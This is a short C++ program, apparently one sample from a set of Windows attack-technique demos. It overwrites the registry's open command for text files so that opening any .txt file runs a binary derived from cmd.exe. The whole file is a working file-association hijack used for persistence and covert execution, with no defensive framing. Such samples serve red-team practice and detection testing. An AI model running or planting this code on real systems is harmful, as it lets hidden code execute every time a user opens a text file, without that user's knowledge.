#include <windows.h>
#include <string>

#include "..\..\utils.h"

using namespace std;

HKEY RootKey = HKEY_CLASSES_ROOT;
LPCSTR SubKey = "txtfile\\shell\\open\\command";

string ExeName = "Cmd.exe";
string ExePath = string(getenv("WINDIR")) + "\\System32\\" + ExeName;

int main(){

    string binaryPath = newBinary(ExePath);

    set_registry_value(RootKey, SubKey, NULL, &binaryPath, NULL, true);

    return 0;
}